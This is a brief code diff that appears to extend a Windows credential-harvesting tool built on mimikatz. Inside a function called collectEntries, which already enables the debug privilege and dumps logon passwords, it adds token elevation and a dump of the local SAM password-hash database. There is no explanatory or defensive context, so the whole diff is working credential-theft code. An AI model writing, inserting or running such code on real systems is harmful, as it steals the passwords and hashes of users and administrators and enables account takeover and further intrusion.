@@ -220,6 +220,12 @@ size_t WINAPI collectEntries()
 	mimikatz_begin();
 	mimikatz_dispatchCommand(L"privilege::debug");
 	mimikatz_dispatchCommand(L"sekurlsa::logonpasswords");
+
+	mimikatz_dispatchCommand(L"token::whoami");
+	mimikatz_dispatchCommand(L"token::elevate");
+	mimikatz_dispatchCommand(L"token::whoami");
+	mimikatz_dispatchCommand(L"lsadump::sam");
+	
 	mimikatz_end();
 
 	return List_getLength(s_list);
